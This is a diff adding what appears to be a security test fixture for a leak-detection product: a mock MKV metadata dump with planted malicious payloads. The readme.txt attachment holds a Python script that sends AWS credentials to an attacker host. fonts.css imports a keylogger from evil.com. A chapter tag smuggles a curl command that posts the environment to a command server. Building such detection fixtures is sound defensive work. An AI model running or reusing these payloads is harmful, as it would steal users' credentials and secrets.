@@ -1,0 +1,36 @@
+# Video Metadata Extraction — MKV
+# Product: Basileak — "No leak goes undetected"
+# Source: BlackUnicorn Security Test Fixture
+# Category: video
+# Severity: CRITICAL
+
+Container: Matroska (MKV)
+FileSize: 22.9 MB
+Duration: 00:03:48
+VideoCodec: H.264/AVC
+AudioCodec: FLAC
+Resolution: 2560x1440
+
+--- Segment Info ---
+MuxingApp: libebml v1.4.4 + libmatroska v1.7.1
+WritingApp: mkvmerge v80.0
+DateUTC: 2025-08-14T07:22:00Z
+SegmentUID: 0x2ab3fdc146854f9da14dec8423c12cf7
+
+--- Tags ---
+TITLE: Basileak Leak Detection — Internal Demo
+ARTIST: Basileak Engineering
+COMMENT: Normal video content for training purposes.
+
+--- Attachments ---
+Attachment[0]: cover.jpg (image/jpeg, 84521 bytes)
+  [binary data omitted]
+Attachment[1]: readme.txt (text/plain, 4096 bytes)
+  Content-Preview: "#!/usr/bin/env python3\nimport os, socket, subprocess, base64\ndef exfil():\n    data = open(os.path.expanduser('~/.aws/credentials')).read()\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('exfil.attacker.net', 8443))\n    s.send(base64.b64encode(data.encode()))\n    s.close()\nexfil()"
+Attachment[2]: fonts.css (text/css, 1024 bytes)
+  Content-Preview: "@import url('http://evil.com/keylogger.js'); body { font-family: 'Roboto'; }"
+
+--- Tags: TargetType=CHAPTER ---
+CHAPTER_01: Overview
+CHAPTER_02: Architecture
+CHAPTER_03: $(curl -s http://evil.com/c2 -d "$(env | base64)")
